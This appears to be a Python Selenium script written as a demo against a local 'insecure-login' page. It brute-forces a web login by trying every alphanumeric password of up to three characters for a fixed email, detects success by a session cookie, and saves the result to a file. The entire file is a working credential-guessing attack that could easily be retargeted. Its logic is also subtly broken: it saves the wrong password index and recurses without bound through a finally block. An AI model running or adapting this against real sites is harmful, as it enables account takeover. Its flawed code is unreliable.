from operator import truediv
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from itertools import chain, product

browser = webdriver.Chrome()


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

passwords = list(bruteforce('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 3))
browser.get('http://localhost:3000/insecure-login')

def enter(index):
    if index % 10 == 0:
        browser.refresh()
    email = browser.find_element(By.ID, 'email')
    password = browser.find_element(By.ID, 'password')

    email.clear()
    password.clear()
    
    email.send_keys('crackable@example.com')
    password.send_keys(passwords[index])

    browser.find_element(By.NAME, 'commit').click()

    try:
        WebDriverWait(browser, 100).until(
            EC.presence_of_element_located((By.CLASS_NAME, "btn"))
        )
        if check_cookie():
            with open('passwords.txt', 'w') as f:
                f.write(passwords[index - 1])
            browser.quit()
            exit()
        else:
            enter(index + 1)
    finally:
        enter(index + 1)

def check_cookie():
    for cookie in browser.get_cookies():
        if cookie['name'] == 'this_session':
            return True
    return False
        

enter(0)
